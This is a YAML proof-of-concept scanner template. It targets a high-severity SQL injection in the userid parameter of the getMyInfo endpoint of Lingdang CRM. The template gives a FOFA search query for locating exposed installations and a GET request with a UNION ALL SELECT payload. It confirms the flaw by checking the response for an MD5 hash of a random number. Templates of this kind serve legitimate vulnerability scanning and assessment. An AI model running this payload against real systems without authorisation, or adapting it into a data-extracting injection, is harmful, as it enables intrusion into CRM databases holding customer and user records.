id: poc-yaml-51mis-crm-getmyinfo-userid-sqli
info:
  name: 灵当CRM getMyInfo userid SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 灵当CRM
  fofa: body="crmcommon/js/jquery/jquery-1.10.1.min.js" || (body="http://localhost:8088/crm/index.php"
    && body="ldcrm.base.js")
variables:
  t1: random_int(1000,10000)
  t2: md5(t1)
requests:
- method: GET
  path: /crm/WeiXinApp/marketing/index.php?module=Users&action=getMyInfo&userid=1+UNION+ALL+SELECT+md5({{.t1}}),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+-
  expression: "status_code == 200 && \ncontains(body,\"\\\"avatar\\\"\") &&\ncontains(body,t2)\
    \ &&\n!contains(body,\"<\")\n"
transport: http
